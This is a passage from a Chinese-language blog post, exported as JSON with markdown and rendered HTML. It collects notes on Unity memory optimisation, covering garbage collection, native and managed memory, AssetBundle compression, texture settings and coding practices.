String相关;在C#中，String字符串是引用类型而不是值类型。C#中的字符串是不可变更的，其引用指向的值在创建后是不可被变更的。因此在创建或者丢弃字符串的时候，会造成托管堆内存分配。推荐做法：减少不必要的字符串创建，提前创建并持有缓存;减少不必要的字符串操作，比如常用的+。每次在对字符串进行操作的时候（例如运用字符串的”+”操作），unity会新建一个字符串用来存储相加后的字符串。然后使之前的旧字符串被标记为废弃，成为内存垃圾。改用StringBuilder类 , StringBuilder就是专门设计用来创建字符串而不产生额外托管堆分配的类，而且可以避免字符串拼接产生垃圾\n> 注意由于调用Unity的API所造成的堆内存分配;如果函数需要返回一个数组，则一个新的数组会被创建用作结果返回，简单地缓存一个对数组的引用;函数gameobject.name或gameobject.tag，可以使用一个相关的联合函数。用Input.GetTouch()和Input.touchCount()来代替Input.touches或者用Physics.SphereCastNonAlloc()来代替Physics.SphereCastAll();mesh.vertices 每次调用也是会造成开销的.\n\n* unity的mono堆内存分配后会返还给系统吗？\n> 不会，目前Unity所使用的Mono版本存在一个很严重的问题，Mono的堆内存是只升不降。\n> 新一代版本会返回给系统,IL2CPP 版本的也会返回\n\n\nVM : mono的一个VM内存池,虚拟机的内存池.VM内存会返回内存给OS内存,当一块内存 GC 6次没有被访问到,就会将内存放回给OS\nGC :\n[分代式内存回收](https://www.cnblogs.com/nele/p/5673215.html)\nGC机制考量,\nThroughput(回收能力):一次GC会回收到多少内存\npause times(暂停时长):一次GC对主线程影响多大,会让主线程暂停多少毫秒\nFragmentation(碎片化):一次GC内存回收之后,会让整块内存的碎片化增加多少,即不连续内存会增加多少.\nMutator overhead(额外消耗):回收本身有消耗,需要考量这个消耗有多大.\nSoalability(可扩展性):多核多线程时会不会有其他bug\nPortability(可移植性):在其他平台上面是否可以移植\n\n目前GC:\nunity现在使用的是:Boehm(Non-generational)非分代式,(Non-compaction)非压缩方式,内存回收机制,是所有内存同一放在一起的.造成主线程的卡顿\n\n- 下一代GC:\n    - Incremental GC(渐进式GC),分帧去做GC回收,GC时长还是一样的,但是会避免系统卡顿;目前已转向IL2CPP(升级的Boehm)了.\n\n\n- 问题:内存下降,但是总体的内存池还是上升了,为什么?\n    - 是代码碎片化导致的.因为有一块内存一直插不进去当前内存池里面,只能另行开辟内存.也就是内存碎片化没有被压缩.优化建议,先去对大型内存创建和释放,再对小型内存进行创建和释放.\n    - Zimbie Memory(僵尸内存,别名就叫做脏内存,无用内存) :指内存从开启游戏到游戏关闭只用了一次内存.没有被释放,内存也没有泄露,也没办法使用.内存泄漏指得是没有任何人可以访问和管理到它,也没法释放掉.优化建议:不要觉得 obj == null就是释放掉内存了,显示调用destroy方法才可以释放掉.\n    - 要常用struct不要用class\n    - Pool In Pool (池中池) 高频使用的小部件需要建立一个内存池,不要频繁的去创建销毁Closures and anonymous methods (闭包和匿名函数,协程) 这些东西最终在C++层全部new成一个class了,优化建议:不要用.关于协程的优化建议:用的时候创建,及时销毁.再用时,再创建,再销毁.\n    - 配置表优化,优化建议,采用C++管理内存,使用C#接口以及Lua接口去查询,而不是在c#和Lua里面保存内存,不要在c#和Lua里面重新全部记录.例如:从C++接过配置表对象时,在c#里面再保存一份,这是错误的方式.\n    - Singleton 单例慎用,仅在必要时用,最好不要用单例模板,太坑爹的设计了,难用不说还特么代码难看懂,恶心.\n\n\n#### 第三方库(主要是lua优化)-->\n- 需要查看tolua源码以及C++基础,然后在tolua的基础上面做优化,需要的个人能力比较强.\n以及使用C++库作为插件导入进unity里面使用.\n\n#### unity底层代码优化方向-->\n底层会根据类型将内存分配到不同的Allooator的池子里面,使用GetRuntimeMemory\nprofiler中Memory一项中的Used Total 和 Reserved Total会保持相同的上升或者下降,如果不一致,那就是出bug了.\nUsed Total 表示当前你使用了多少内存\nReserved Total表示unity申请了多少内存,将要使用到的内存\n1: Scene中的GameObject太多,则内存会暴涨.如果在场景中创建了一个GameObject,底层C++会创建一个或者多个object(记录component),去记录这个GameObject的信息.是程序的优化重点,建议:尽量少创建GameObject,并且无用GameObject尽量干掉,优化GameObject个数.\n2: Audio中会有个缓存池(DSP buffer),需要用户设置,填充满就会向CPU发送播放指令,发送完播放指令才会播放.设置的过大,则音频填充满就会时间过长,声音延迟,设置的过小,就会向CPU频繁发送.优化建议:测试音频播放密集时与不密集时的样本,并进行大小变换设置.\nForce to mono,双声道音频设置,双声道概念:左右声道播放的不一致的声音.优化建议,设置为单声道.\n音频格式Format,Mac/iOS上面的音频设置为mp3,有硬件支持.\n音频压缩格式Compression Format:在哪种情况下使用哪种形态,需要去unity官方手册上面查询.\n3: CodeSize,模板泛型的乱用,会导致打包速度,并且静态代码量增多.模板泛型,(il2cpp)会在C++层将泛型全部转成静态类型的C++,会变的很大.(一个文件2-3m已经很多了吧,官方视频上说有25M!  ...)\n4: AssetBundle \ntypetree,序列化的时候会生成一个typetree,反序列化的时候会根据这个typetree反序列化.\n关闭typetree内存会减小,包大小会减小,build和运行时会变快.\nLz4 压缩方式,快速压缩,包体大Lzma上面30%,不要用Lzma,lzma会增大内存等等副作用.\nasset会有头记录部分,以及实际的数据部分,如果每一个都打成ab则有可能发生,头记录部分比实际数据部分还要大,建议是1-2M,5G以后可以加大.\n5:Resource 文件夹 ,打进包的时候会做一个红黑树(R-B Tree),会检索数据在什么位置,这个里面的数据很大,则红黑树就会很大.优化建议:不要放大量数据就行了,用ab替换.\n6:Texture\nupload buffer 这个数据表示填满之后向GPU发送一次,建议测试并平均该值\nR/W read and write 一般情况下不要开,开启情况会在显存和内存中各一份.\nmip maps UI情况下不要开就行了.\n7: mesh   \nR/W 一般情况下不要开. compression在某些unity版本上面开了比不开占用更多内存.\n\n\n###### tips:[加快Unity编辑器下脚本编译速度](https://www.xuanyusong.com/archives/4474)\n\n\n创建与加载monobehavier以后，内存中有大量这种东西，内存中是没有做过优化的，内存结构不合理，不够紧凑，分散点比较多，cpu也没有将这些事情并行处理，monobehavier里面的方法还是有反射到c++层使用的\n\n***\n\n# C#与非托管DLL进行交互\nhttps://blog.csdn.net/salvare/article/details/80087488\n\n# Unity内存管理的核心问题\n\n* 1:内存使用是否合适? 内存块大小,碎片化.\n* 2:内存泄露如何解决? 僵尸内存\n* 3:Reserved Total 内存总量尽量小于80M\n* 4:纹理资源内存尽量小于 50M,\n* 5:网格资源内存尽量小于 20M,模型的 Tangents 尽量选择 None\n* 6:RenderTexture 内存峰值,需要控制分辨率,需要关注 Antialiasing(反锯齿)\n* 7:ParticleSystem 粒子系统总体使用数量\n* 8:AssetBundle资源冗余,如何做到零冗余-->https://blog.uwa4d.com/archives/1577.html\n* 9:AssetBundle(SerializedFile)尽量小于 50 个\n* 10:关注一次性分配过多内存,关注哪个函数在分配内存.配表解析,New Class,String 操作,Instantiate,格式转换\n* 11:内存泄露,每1000 帧需要获取一下堆内存和变量数.","slug":"Unity/Optimize/Unity内存优化","published":1,"updated":"2020-07-11T02:45:25.440Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0b003q2gk78xof1u6v","content":"<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://docs.unity.cn/cn/current/Manual/BestPracticeGuides.html\" target=\"_blank\" rel=\"noopener\">https://docs.unity.cn/cn/current/Manual/BestPracticeGuides.html</a><br><a href=\"https://www.bilibili.com/video/BV1aJ411t7N6\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/BV1aJ411t7N6</a><br><a href=\"https://zhuanlan.zhihu.com/p/61105374\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/61105374</a></p>\n<h1 id=\"GC\"><a href=\"#GC\" class=\"headerlink\" title=\"GC\"></a>GC</h1><ul>\n<li>1:<a href=\"https://mp.weixin.qq.com/s/ARNJtujrHKgxBWuanO0tpA\" target=\"_blank\" rel=\"noopener\">GC优化</a></li>\n</ul>\n<h1 id=\"内存分类\"><a href=\"#内存分类\" class=\"headerlink\" title=\"内存分类\"></a>内存分类</h1><p>Unity 3D中的内存管理 <a href=\"http://onevcat.com/2012/11/memory-in-unity3d/\" target=\"_blank\" rel=\"noopener\">http://onevcat.com/2012/11/memory-in-unity3d/</a></p>\n<h1 id=\"资源内存\"><a href=\"#资源内存\" class=\"headerlink\" title=\"资源内存\"></a>资源内存</h1><p><a href=\"https://www.cnblogs.com/88999660/archive/2013/03/15/2961663.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/88999660/archive/2013/03/15/2961663.html</a></p>\n<h1 id=\"概念理解\"><a href=\"#概念理解\" class=\"headerlink\" title=\"概念理解\"></a>概念理解</h1><h4 id=\"内存\"><a href=\"#内存\" class=\"headerlink\" title=\"内存\"></a>内存</h4><ul>\n<li>物理内存:CPU 访问内存是一个慢速过程,减少Cache Miss,ECS 和 DOTS</li>\n<li>虚拟内存:内存交换,移动设备不支持内存交换,iOS 可以进行内存压缩,Android 没有内存压缩能力</li>\n<li>内存杀手 low memory killer(AKA lmk),内存不足时，killer 会出现，从上图底层一层一层地向上杀。（Cached-Previous-Home…）<br><img src=\"/2020/05/08/Unity/Optimize/Unity%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96/%E5%86%85%E5%AD%98%E6%9D%80%E6%89%8B.png\" alt=\"内存杀手\"></li>\n</ul>\n<h4 id=\"Unity-内存管理\"><a href=\"#Unity-内存管理\" class=\"headerlink\" title=\"Unity 内存管理\"></a>Unity 内存管理</h4><ul>\n<li>Unity 是一个 C++ 引擎<ul>\n<li>底层代码完全由 C++ 写成</li>\n<li>通过 Wrapper 提供给用户 API ; .binding 链接 C#与 C++的语言,目前逐渐转成 C#</li>\n<li>用户代码会转换为 CPP 代码 （il2cpp）<ul>\n<li>VM 仍然存在（il2cpp vm）,主要是为了跨平台</li>\n</ul>\n</li>\n<li>Editor ,package,都是用 C#写的</li>\n</ul>\n</li>\n<li>Unity 内存按照分配方式分为：<ul>\n<li>Native Memory</li>\n<li>Managed Memory</li>\n<li>Editor &amp; Runtime 是完全不同的<ul>\n<li>不止是统计看到的内存大小不同，甚至是内存分配时机和方式也不同</li>\n<li>Asset 在 Runtime 中如果不读取，是不会进内存的，但 Editor 打开就占内存。因为 Editor 不注重 Runtime 的表现，更注重编辑器中编辑时的流畅。<ul>\n<li>但如果游戏庞大到几十个 G，如果第一次打开项目，会消耗很多时间，有的大的会几天，甚至到一周。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Unity 内存按照管理者分为：<ul>\n<li>引擎管理内存</li>\n<li>用户管理内存（应优先考虑）</li>\n</ul>\n</li>\n<li>Unity 检测不到的内存<ul>\n<li>用户分配的 native 内存<ul>\n<li>自己写的 Native 插件（C++ 插件）， Unity 无法分析已经编译过的 C++ 是如何去分配和使用内存的。</li>\n<li>Lua 完全由自己管理内存，Unity 无法统计到内部的使用情况。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"Unity-游戏应用的4种内存类型\"><a href=\"#Unity-游戏应用的4种内存类型\" class=\"headerlink\" title=\"Unity 游戏应用的4种内存类型\"></a>Unity 游戏应用的4种内存类型</h4><ul>\n<li><p>1: Unity底层(C++层,本机堆,核心代码,unityengine.dll等一系列别称)占用的内存,包含Scene,Audio,CodeSize,贴图等.Unity使用了自己的一套内存管理机制来使这块内存具有和托管堆类似的功能。基本理念是，如果在这个关卡里需要某个资源，那么在需要时就加载，之后在没有任何引用时进行卸载。听起来很美好也和托管堆一样，但是由于Unity有一套自动加载和卸载资源的机制，让两者变得差别很大。自动加载资源可以为开发者省不少事儿，但是同时也意味着开发者失去了手动管理所有加载资源的权力，这非常容易导致大量的内存占用（贴图什么的你懂的），也是Unity给人留下“吃内存”印象的罪魁祸首。       </p>\n</li>\n<li><p>2: Unity的托管堆（Managed Heap）,托管内存,也被称为用户管理的内存,<a href=\"http://www.mono-project.com/Main_Page\" target=\"_blank\" rel=\"noopener\">Mono</a>项目一个开源的.net框架的一种实现，对于Unity开发，其实充当了基本类库的角色。托管堆用来存放类的实例（比如用new生成的列表，实例中的各种声明的变量等）。“托管”的意思是Mono“应该”自动地改变堆的大小来适应你所需要的内存，并且定时地使用垃圾回收（Garbage Collect）来释放已经不需要的内存。关键在于，有时候你会忘记清除对已经不需要再使用的内存的引用，从而导致Mono认为这块内存一直有用，而无法回收。profile可以检测到.并且需要手机查找才正常,经常需要优化的部分.</p>\n</li>\n<li><p>3: 代码文件的内存.如lua脚本本身的内存.C#泛型类的内存,C++层会将泛型编译成静态类型就多出很多文件,尽量注意不要使用太多泛型模板类,shader写的一个,但是编译成很多份的文件等,都是代码文件会占用的内存.<br>程序代码包括了所有的Unity引擎，使用的库，以及你所写的所有的游戏代码。在编译后，得到的运行文件将会被加载到设备中执行，并占用一定内存。这部分内存实际上是没有办法去“管理”的，它们将在内存中从一开始到最后一直存在。一个空的Unity默认场景，什么代码都不放，在iOS设备上占用内存应该在17MB左右，而加上一些自己的代码很容易就飙到20MB左右。想要减少这部分内存的使用，能做的就是减少使用的库。 </p>\n</li>\n<li><p>4: 第三方库的占用的内存,也被称为用户管理的内存,但是已经和unity的内存关系上完全无关了,如自己使用C++编译的库,tolua占用的内存,lua文件占用的内存(这个不是unity管理的),lua占用的内存. 并且unity编辑器的profile无法检测到.</p>\n</li>\n</ul>\n<h1 id=\"Unity-Native-Memory-管理以及优化\"><a href=\"#Unity-Native-Memory-管理以及优化\" class=\"headerlink\" title=\"Unity Native Memory 管理以及优化\"></a>Unity Native Memory 管理以及优化</h1><ul>\n<li><p>Unity 重载了所有分配内存的操作符（C++ alloc、new），使用这些重载的时候，会需要一个额外的 memory label （Profiler-shaderlab-object-memory-detail-snapshot，里面的名字就是 label：指当前内存要分配到哪一个类型池里面）</p>\n</li>\n<li><p>使用重载过的分配符去分配内存时，Allocator 会根据你的 memory label 分配到不同 Allocator 池里面，每个 Allocator 池 单独做自己的跟踪。因此当我们去 Runtime get memory label 下面的池时就可以问 Allocator，里面有多少东西 多少兆。</p>\n</li>\n<li><p>Allocator 在 NewAsRoot 中生成,生成了一个 memory island(root)。在这个 memory island(root) 下面会有很多子内存：shader：当我们加载一个 Shader 进内存的时候，会生成一个 Shader 的 root。Shader 底下有很多数据：sub shader、Pass 等会作为 memory (root) 的成员去依次分配。因此当我们最后统计 Runtime 的时候，我们会统计 Root，而不会统计成员，因为太多了没法统计。</p>\n</li>\n<li><p>因为是 C++ 的，因此当我们 delete、free 一个内存的时候会立刻返回内存给系统，与托管内存堆不一样。</p>\n</li>\n<li><p>Scene</p>\n<ul>\n<li>Unity 是一个 C++ 引擎，所有实体最终都会反映在 C++ 上，而不是托管堆里面。因此当我们实例化一个 GameObject 的时候，在 Unity 底层会构建一个或多个 Object 来存储这个 GameObject 的信息，例如很多 Components。因此当 Scene 有过多 GameObject 的时候，Native 内存就会显著上升。</li>\n<li>当我们看 Profiler，发现 Native 内存大量上升的时候，应先去检查 Scene。</li>\n</ul>\n</li>\n<li><p>Audio</p>\n<ul>\n<li><p>DSP buffer （声音的缓冲）</p>\n<ul>\n<li><p>当一个声音要播放的时候，它需要向 CPU 去发送指令——我要播放声音。但如果声音的数据量非常小，就会造成频繁地向 CPU 发送指令，会造成 I\\O。</p>\n</li>\n<li><p>当 Unity 用到 FMOD 声音引擎时（Unity 底层也用到 FMOD），会有一个 Buffer，当 Buffer 填充满了，才会向 CPU 发送 “我要播放声音” 的指令。</p>\n</li>\n<li><p>DSP buffer 会导致两种问题：</p>\n<ul>\n<li><p>如果（设置的） buffer 过大，会导致声音的延迟。要填充满 buffer 是要很多声音数据的，但声音数据又没这么大，因此会导致一定的<strong>声音延迟</strong>。</p>\n</li>\n<li><p>如果 DSP buffer 太小，会导致 CPU 负担上升，满了就发，消耗增加。</p>\n<p><a href=\"https://docs.unity3d.com/Manual/class-AudioManager.html\" target=\"_blank\" rel=\"noopener\">Audio</a></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Force to mono</p>\n<ul>\n<li>在导入声音的时候有一个设置，很多音效师为了声音质量，会把声音设为双声道。但 95% 的声音，左右声道放的是完全一样的数据。这导致了 1M 的声音会变成 2M，体现在包体里和内存里。因此一般对于声音不是很敏感的游戏，会建议改成 Force to mono，强制单声道。</li>\n</ul>\n</li>\n<li><p>Format</p>\n</li>\n<li><p>Compression Format（看文档，有使用建议）</p>\n</li>\n</ul>\n</li>\n<li><p>Code Size</p>\n<ul>\n<li>C++ 模板泛型的滥用,会影响到 Code Size、打包的速度。会翻译成 CPP 文件,如果泛型过多,则会造成 CPP 过大,每一个泛型都会生成一个对应的 class,都会变成静态类型.<ul>\n<li>可以参考 <a href=\"https://learn.unity.com/tutorial/memory-management-in-unity\" target=\"_blank\" rel=\"noopener\">Memory Management in Unity</a> 3.IL2CPP &amp; Mono 的 Generic Sharing 部分。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>AssetBundle</p>\n<ul>\n<li><p>TypeTree</p>\n<ul>\n<li>Unity 的每一种类型都有很多数据结构的改变，为了对此做兼容，Unity 会在生成数据类型序列化的时候，顺便会生成 TypeTree：当前我这一个版本里用到了哪些变量，对应的数据类型是什么。在反序列化的时候，会根据 TypeTree 来进行反序列化。<ul>\n<li>如果上一个版本的类型在这个版本中没有，TypeTree 就没有它，因此不会碰到它。</li>\n<li>如果要用一个新的类型，但在这个版本中不存在，会用一个默认值来序列化，从而保证了不会在不同的版本序列化中出错，这个就是 TypeTree 的作用。</li>\n</ul>\n</li>\n<li>Build AssetBundle 中有开关可以关掉 TypeTree。当你确认当前 AssetBundle 的使用和 Build Unity 的版本一模一样，这时候可以把 TypeTree 关掉。<ul>\n<li>例如如果用同样的 Unity 打出来的 AssetBundle 和 APP，TypeTree 则完全可以关掉。</li>\n</ul>\n</li>\n<li>TypeTree 好处：<ul>\n<li>内存减少。TypeTree 本身是数据，也要占内存。</li>\n<li>包大小会减少，因为 TypeTree 会序列化到 AssetBundle 包中，以便读取。</li>\n<li>Build 和运行时会变快。源代码中可以看到，因为每一次 Serialize 东西的时候，如果发现需要 Serialize TypeTree，则会 Serialize 两次：<ul>\n<li>第一次先把 TypeTree Serialize 出来</li>\n<li>第二次把实际的东西 Serialize 出来</li>\n<li>反序列化也会做同样的事情，1. TypeTree 反序列化，2. 实际的东西反序列化。</li>\n</ul>\n</li>\n<li>因此如果确定 TypeTree 不会对兼容性造成影响，可以把它关掉。这样对 Size 大小和 Build Runtime 都会获得收益。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>压缩方式：</p>\n<ul>\n<li><p>Lz4</p>\n<p>  <a href=\"https://docs.unity3d.com/2019.3/Documentation/ScriptReference/BuildCompression.LZ4.html\" target=\"_blank\" rel=\"noopener\">BuildCompression.LZ4</a></p>\n<ul>\n<li>LZ4HC “Chunk Based” Compression. 非常快</li>\n<li>和 Lzma 相比，平均压缩比率差 30%。也就是说会导致包体大一点，但是（作者说）速度能快 10 倍以上。</li>\n</ul>\n</li>\n<li><p>Lzma</p>\n<p>  <a href=\"https://docs.unity3d.com/2019.3/Documentation/ScriptReference/BuildCompression.LZMA.html\" target=\"_blank\" rel=\"noopener\">BuildCompression.LZMA</a></p>\n<ul>\n<li>Lzma 基本上就不要用了，因为解压和读取速度上都会比较慢。</li>\n<li>还会占大量内存<ul>\n<li>因为是 Steam based 而不是 Chunk Based 的，因此需要一次全解压</li>\n<li>Chunk Based 可以一块一块解压<ul>\n<li>如果发现一个文件在第 5-10 块，那么 LZ4 会依次将 第 5 6 7 8 9 10 块分别解压出来，每次（chunk 的）解压会重用之前的内存，来减少内存的峰值。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>预告：中国版 Unity 会在下个版本（1月5号或2月份）推出新的功能：基于 LZ4 的 AssetBundle 加密，只支持 LZ4。</p>\n</li>\n<li><p>Size &amp; count</p>\n<ul>\n<li>AssetBundle 包打多大是很玄学的问题，但每一个 Asset 打一个 Bundle 这样不太好。<ul>\n<li>有一种减图片大小的方式，把 png 的头都提出来。因为头的色板是通用的，而数据不通用。AssetBundle 也一样，一部分是它的头，一部分是实际打包的部分。因此如果每个 Asset 都打 Bundle 会导致 AssetBundle 的头比数据还要大。</li>\n</ul>\n</li>\n<li>官方的建议是每个 AssetBundle 包大概 1M~2M 左右大小，考虑的是网络带宽。但现在 5G 的时候，可以考虑适当把包体加大。还是要看实际用户的情况。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Resource 文件夹（<strong>Do not use it</strong>. 除非在 debug 的时候）</p>\n<ul>\n<li>Resource 和 AssetBundle 一样，也有头来索引。Resource  在打进包的时候会做一个红黑树，来帮助 Resource 来检索资源在什么位置，</li>\n<li>如果 Resource 非常大，那么红黑树也会非常大。</li>\n<li>红黑树是不可卸载的。在刚开始游戏的时候就会加载进内存中，会持续对游戏造成内存压力。</li>\n<li>会极大拖慢游戏的启动时间。因为红黑树没加载完，游戏不能启动。</li>\n</ul>\n</li>\n<li><p>Texture</p>\n<ul>\n<li><p>upload buffer，和声音的很像：填满多大，就向 CPU push 一次。</p>\n</li>\n<li><p>r/w</p>\n<ul>\n<li>Texture 没必要就不要开 read and write。正常 Texture 读进内存，解析完了，放到 upload buffer 里后，内存里的就会 delete 掉。</li>\n<li>但如果检测到你开了 r/w 就不会 delete 了，就会在显存和内存中各一份。</li>\n</ul>\n</li>\n<li><p>Mip Maps</p>\n<ul>\n<li>UI 没必要开，可以省大量内存。</li>\n</ul>\n</li>\n<li><p>Mesh</p>\n<ul>\n<li>r/w</li>\n<li>compression<ul>\n<li>有些版本 Compression 开了不如不开，内存占用可能更严重，具体需要自己试。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Assets</p>\n<ul>\n<li><p>Assets 的数量实际上和 asset 整个的纹理是有关系的。（？）</p>\n<p><a href=\"https://learn.unity.com/tutorial/memory-management-in-unity\" target=\"_blank\" rel=\"noopener\">Memory Management in Unity - Unity Learn</a></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"Unity-Managed-Memory-优化用户管理内存\"><a href=\"#Unity-Managed-Memory-优化用户管理内存\" class=\"headerlink\" title=\"Unity Managed Memory 优化用户管理内存\"></a>Unity Managed Memory 优化用户管理内存</h4><p><a href=\"https://docs.unity3d.com/Manual/BestPracticeUnderstandingPerformanceInUnity4-1.html\" target=\"_blank\" rel=\"noopener\">Understanding the managed heap</a></p>\n<ul>\n<li><p>VM 内存池</p>\n<ul>\n<li>mono 虚拟机的内存池</li>\n<li>VM 会返还内存给 OS 吗？<ul>\n<li><strong>会</strong></li>\n</ul>\n</li>\n<li>返还条件是什么？<ul>\n<li>GC 不会把内存返还给系统</li>\n<li>内存也是以 Block 来管理的。当一个 Block 连续六次 GC 没有被访问到，这块内存才会被返还到系统。（mono runtime 基本看不到，IL2cpp runtime 可能会看到多一点）</li>\n</ul>\n</li>\n<li>不会频繁地分配内存，而是一次分配一大块。</li>\n</ul>\n</li>\n<li><p>GC 机制（BOEHM Non-generational 不分代的）</p>\n<ul>\n<li><p>GC 机制考量</p>\n<ul>\n<li>Throughput(（回收能力）<ul>\n<li>一次回收，会回收多少内存</li>\n</ul>\n</li>\n<li>Pause times（暂停时长）<ul>\n<li>进行回收的时候，对主线程的影响有多大</li>\n</ul>\n</li>\n<li>Fragmentation（碎片化）<ul>\n<li>回收内存后，会对整体回收内存池的贡献有多少</li>\n</ul>\n</li>\n<li>Mutator overhead（额外消耗）<ul>\n<li>回收本身有 overhead，要做很多统计、标记的工作</li>\n</ul>\n</li>\n<li>Scalability（可扩展性）<ul>\n<li>扩展到多核、多线程会不会有 bug</li>\n</ul>\n</li>\n<li>Protability（可移植性）<ul>\n<li>不同平台是否可以使用</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>BOEHM</p>\n<ul>\n<li><p>Non-generational（不分代的）</p>\n<p>  <img src=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8934bc1f-3e98-4544-b6de-6ea5b80e2850/Untitled.png\" alt=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8934bc1f-3e98-4544-b6de-6ea5b80e2850/Untitled.png\"></p>\n<ul>\n<li>分代是指：大块内存、小内存、超小内存是分在不同内存区域来进行管理的。还有长久内存，当有一个内存很久没动的时候会移到长久内存区域中，从而省出内存给更频繁分配的内存。</li>\n<li>“非代数”是不分代的,指必须扫描整个托管堆，因此在执行收集传递时必须扫描整个堆，因此其性能因堆的大小扩展而降低。</li>\n</ul>\n</li>\n<li><p>Non-compacting（非压缩式）</p>\n<p>  <img src=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33a4002e-f37e-4405-b9b3-815c0f43caba/Untitled.png\" alt=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33a4002e-f37e-4405-b9b3-815c0f43caba/Untitled.png\"></p>\n<ul>\n<li>当有内存被回收的时候，压缩内存会把上图空的地方重新排布。是指当释放的内存产生的间隙不会消失。也就是说对象被销毁，内存被释放，这块内存不会马上收集成为空闲内存的一部分，这块内存只能用来存储比释放对象相同或更小的数据，如果内存间隔太小，会产生内存碎片.即使可能有足够的总空间来容纳某个分配，托管堆也无法找到足够大的连续内存块来适合分配。</li>\n<li>但 Unity 的 BOEHM 不会！它是非压缩式的。空着就空着，下次要用了再填进去。<ul>\n<li>历史原因：Unity 和 Mono 合作上，Mono 并不是一直开源免费的，因此 Unity 选择不升级 Mono，与实际 Mono 版本有差距。</li>\n<li>下一代 GC<ul>\n<li>Incremental GC（渐进式 GC）<ul>\n<li>现在如果我们要进行一次 GC，主线程被迫要停下来，遍历所有 GC Memory “island”（没听清），来决定哪些 GC 可以回收。</li>\n<li>Incremental GC 把暂停主线程的事分帧做了。一点一点分析，主线程不会有峰值。总体 GC 时间不变，但会改善 GC 对主线程的卡顿影响。</li>\n</ul>\n</li>\n<li>SGen 或者升级 Boehm？<ul>\n<li>SGen 是分代的，能避免内存碎片化问题，调动策略，速度较快</li>\n</ul>\n</li>\n<li>IL2CPP<ul>\n<li>现在 IL2CPP 的 GC 机制是 Unity 自己重新写的，是升级版的 Boehm</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Memory fragmentation 内存碎片化</p>\n<p>  <img src=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/96caa361-8d1a-4f8e-a0b6-87d521bb7f14/Untitled.png\" alt=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/96caa361-8d1a-4f8e-a0b6-87d521bb7f14/Untitled.png\"></p>\n<ul>\n<li>为什么内存下降了，但总体内存池还是上升了？<ul>\n<li>因为内存太大了，内存池没地方放它，虽然有很多内存可用。（内存已被严重碎片化）</li>\n</ul>\n</li>\n<li>当开发者大量加载小内存，使用释放*N，例如配置表、巨大数组，GC 会涨一大截。<ul>\n<li>建议先操作大内存，再操作小内存，以保证内存以最大效率被重复利用。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Zombie Memory（僵尸内存）</p>\n<ul>\n<li>内存泄露说法是不对的，内存只是没有任何人能够管理到，但实际上内存没有被泄露，一直在内存池中，被 zombie 掉了，这种叫 Zombie 内存。</li>\n<li>无用内容<ul>\n<li>Coding 时候或者团队配合的时候有问题，加载了一个东西进来，结果从头到尾只用了一次。</li>\n<li>有些开发者写了队列调度策略，但是策略写的不好，导致一些他觉得会被释放的东西，没有被释放掉。</li>\n<li>找是否有活跃度实际上并不高的内存。</li>\n</ul>\n</li>\n<li>没有释放</li>\n<li>通过代码管理和性能工具分析</li>\n</ul>\n</li>\n<li><p>最佳实践</p>\n<ul>\n<li>Don’t Null it, but Destroy it（显式用 Destory，别用 Null）</li>\n<li>Class VS Struct,尽量用 Struct</li>\n<li>Pool In Pool（池中池）<ul>\n<li>VM 本身有内存池，但建议开发者对高频使用的小部件，自己建一个内存池。例如子弹等,高频使用的小部件。</li>\n</ul>\n</li>\n<li>Closures and anonymous methods（闭包和匿名函数）<ul>\n<li>如果看 IL，所有匿名函数和闭包会 new 成一个 class，因此所有变量和要 new 的东西都是要占内存的。这样会导致协程。<ul>\n<li>有些开发者会在游戏开始启用一个协程，直到游戏结束才释放，这是错误的。</li>\n<li>只要协程不被释放掉，所有内存都会在内存里,在协程里面的内存,只要协程不被释放,则会一直在内存里面。</li>\n<li>用的时候生产一个协程,不用的时候就释放,这是最好的使用协程的方式</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Coroutines（协程）<ul>\n<li>可看做闭包和匿名函数的一个特例</li>\n<li>最佳实践：用的时候生产一个，不用的时候 destroy 掉。</li>\n</ul>\n</li>\n<li>Configurations（配置表）<ul>\n<li>不要把整个配置表都扔进去，是否能通过啥来切分下配置表</li>\n</ul>\n</li>\n<li>Singleton<ul>\n<li>慎用,严格检查使用.</li>\n<li>有些内存从游戏一开始到游戏死掉，一直在内存中。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"优化重点以及方向\"><a href=\"#优化重点以及方向\" class=\"headerlink\" title=\"优化重点以及方向\"></a>优化重点以及方向</h1><p>unity托管内存&gt;第三方库(主要是lua优化)&gt;unity底层优化&gt;代码文件.</p>\n<h4 id=\"unity托管内存-用户管理内存\"><a href=\"#unity托管内存-用户管理内存\" class=\"headerlink\" title=\"unity托管内存(用户管理内存)\"></a>unity托管内存(用户管理内存)</h4><ul>\n<li>c# 一共有几种类型:一共有四类<blockquote>\n<p>1 值类型。在C#中，所有从System.ValueType继承的类型.bool;byte;char;decimal;double;enum;float;int;long;sbyte;short;ushort;uint;ulong;struct<br>2 引用类型。类、接口、委托、object对象;string;stringBuilder;class;interface;delegate<br>3 